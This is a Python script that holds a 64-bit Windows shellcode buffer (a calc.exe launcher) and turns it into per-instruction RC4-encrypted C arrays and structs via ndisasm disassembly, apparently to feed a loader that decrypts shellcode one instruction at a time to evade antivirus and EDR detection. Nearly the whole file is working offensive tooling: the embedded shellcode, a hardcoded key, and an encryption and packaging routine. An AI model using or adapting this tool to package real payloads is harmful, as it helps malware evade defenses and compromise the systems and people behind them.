import subprocess
import tempfile
import sys
import os
from typing import Iterator
from math import floor


buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
buf += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
buf += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
buf += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
buf += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
buf += b"\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
buf += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
buf += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
buf += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
buf += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
buf += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
buf += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
buf += b"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48"
buf += b"\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d"
buf += b"\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5"
buf += b"\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
buf += b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
buf += b"\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"


key = b"\x3b\x21\xff\x41\xe3"



def key_scheduling(key: bytes) -> list[int]:
    sched = [i for i in range(0, 256)]

    i = 0
    for j in range(0, 256):
        i = (i + sched[j] + key[j % len(key)]) % 256
        tmp = sched[j]
        sched[j] = sched[i]
        sched[i] = tmp

    return sched


def stream_generation(sched: list[int]) -> Iterator[bytes]:
    i, j = 0, 0
    while True:
        i = (1 + i) % 256
        j = (sched[i] + j) % 256
        tmp = sched[j]
        sched[j] = sched[i]
        sched[i] = tmp
        yield sched[(sched[i] + sched[j]) % 256]        


def encrypt(plaintext: bytes, key: bytes) -> bytes:
    sched = key_scheduling(key)
    key_stream = stream_generation(sched)
    
    ciphertext = b''
    for char in plaintext:
        enc = char ^ next(key_stream)
        ciphertext += bytes([enc])
        
    return ciphertext


def parse(buf_out):
    cur_op = []
    cur_offset = []
    cur_instr = []

    for line in buf_out.splitlines():
        line = line.strip()
        elems = line.split(None, 2)
        
        if len(elems) == 3:
            cur_op.append(elems[1])
            cur_offset.append(elems[0])
            cur_instr.append(elems[2])

        elif len(elems) == 1 and elems[0][0] == '-':
            cur_op[-1] += elems[0][1:]

    return cur_offset,cur_instr, cur_op


def disassemble(binfile, bits):
    proc = subprocess.Popen(["ndisasm", "-b%u"%(bits), binfile], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    buf_out, buf_err = proc.communicate()
    buf_out = buf_out.decode()
    buf_err = buf_err.decode()
    return parse(buf_out)


def createBinfile(binfd, binfile):
    binfd, binfile = tempfile.mkstemp()
    os.write(binfd, buf)
    os.close(binfd)
    return binfile


if __name__ == "__main__":

    global usage
    usage = f"Usage: python {sys.argv[0]} --help"
    
    if len(sys.argv) < 2:
        print(usage)
        sys.exit(0)

    if sys.argv[1] == "--help":
        print("1: print C struct shellcode mapping")
        print("2: print C struct shellcode mapping + instructions")
        print("3: print Python variables to encrypt")
        print("4: print encrypted shellcode in C format")
        sys.exit(0)

    mod = int(sys.argv[1])
    if mod:
        try:
            bits = 64   # 64 bit shellcode
            binfile = None

            if mod == 1:
                binfd = None
                binfile = createBinfile(binfd, binfile)
                cur_offset = ((disassemble(binfile, bits))[0])
                cur_instr = ((disassemble(binfile, bits))[1])
                cur_op = ((disassemble(binfile, bits))[2])
                i = 0
                for opcode in cur_op:
                    print(f"instruction[{i}].RVA = {str(int(cur_offset[i], 16))};\n" + f"instruction[{i}].quota = {str(floor(len(opcode) / 2))};")
                    i += 1
            
            elif mod == 2:
                binfd = None
                binfile = createBinfile(binfd, binfile)
                cur_offset = ((disassemble(binfile, bits))[0])
                cur_instr = ((disassemble(binfile, bits))[1])
                cur_op = ((disassemble(binfile, bits))[2])
                i = 0
                for opcode in cur_op:
                    print(f"instruction[{i}].RVA = {str(int(cur_offset[i], 16))};\n" + f"instruction[{i}].quota = {str(floor(len(opcode) / 2))};" + f"      {cur_instr[i]}")
                    i += 1
            
            elif mod == 3:
                binfd = None
                binfile = createBinfile(binfd, binfile)
                cur_offset = ((disassemble(binfile, bits))[0])
                cur_instr = ((disassemble(binfile, bits))[1])
                cur_op = ((disassemble(binfile, bits))[2])
                alca = []
                for num in range(len(cur_op)):
                    for i in cur_op[num]:
                        alca.append(i)
                    ops = [''.join(alca[i:i+2]) for i in range(0, len(alca), 2)]
                    print(f"buf{num} = b\"\\x" + "\\x".join(ops) + "\"")
                    alca = []
            
            elif mod == 4:
                binfd = None
                binfile = createBinfile(binfd, binfile)
                cur_offset = ((disassemble(binfile, bits))[0])
                cur_instr = ((disassemble(binfile, bits))[1])
                cur_op = ((disassemble(binfile, bits))[2])
                instrCount = 0
                alca = []
                a = []
                for num in range(len(cur_op)):
                    for i in cur_op[num]:
                        alca.append(i)
                    ops = [''.join(alca[i:i+2]) for i in range(0, len(alca), 2)]
                    var = f"b\"\\x" + "\\x".join(ops) + "\""
                    result = encrypt(eval(var), key)
                    for s in result:
                        a.append(hex(s))
                    instrCount += 1
                    alca = []
                print("\nunsigned char sh[] = { " + ", ".join(a) + " };")
                print(f"\nstatic CRYPT_BYTES_QUOTA instruction[{instrCount}];")
                print("static DWORD instructionCount = " + str(instrCount) + ";")

            else:
                print(usage)
                exit()

        finally:
            if binfile:
                os.unlink(binfile)